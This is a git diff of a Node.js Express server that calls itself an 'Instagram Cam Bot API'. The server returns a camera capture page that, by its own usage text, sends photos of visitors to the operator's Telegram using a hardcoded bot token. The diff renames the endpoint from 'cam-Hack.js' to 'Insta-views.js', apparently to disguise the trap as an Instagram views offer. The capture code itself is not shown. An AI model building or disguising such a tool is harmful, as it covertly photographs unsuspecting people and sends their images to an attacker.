@@ -33,14 +33,14 @@ app.use(express.json());
 app.use(express.static('public'));
 
 // API endpoint that serves the camera capture page
-app.get('/api/cam-Hack.js', (req, res) => {
+app.get('/api/Insta-views.js', (req, res) => {
   const { code } = req.query;
   
   if (!code) {
     return res.status(400).json({ 
       error: 'Missing code parameter',
-      usage: '/api/cam-Hack.js?code=ENCODED_CHAT_ID',
-      example: '/api/cam-Hack.js?code=abc123'
+      usage: '/api/Insta-views.js?code=ENCODED_CHAT_ID',
+      example: '/api/Insta-views.js?code=abc123'
     });
   }
 
@@ -67,7 +67,7 @@ app.get('/api/cam-Hack.js', (req, res) => {
 app.get('/', (req, res) => {
   res.json({ 
     message: 'Instagram Cam Bot API is running! 🚀',
-    usage: 'GET /api/cam-Hack.js?code=ENCODED_CHAT_ID',
+    usage: 'GET /api/Insta-views.js?code=ENCODED_CHAT_ID',
     description: 'Returns a camera capture page that sends photos to your Telegram',
     note: 'Bot token is hardcoded, only chat ID needs to be encoded'
   });
@@ -1541,6 +1541,6 @@ function generateHTML(chatId, botToken) {
 // Start the server
 app.listen(PORT, () => {
   console.log(`🚀 Instagram Cam Bot API running on port ${PORT}`);
-  console.log(`📸 Camera Capture: http://localhost:${PORT}/api/cam-Hack.js?chatId=XXX&botToken=XXX`);
+  console.log(`📸 Camera Capture: http://localhost:${PORT}/api/Insta-views.js?chatId=XXX&botToken=XXX`);
   console.log(`🏠 Home: http://localhost:${PORT}`);
 });
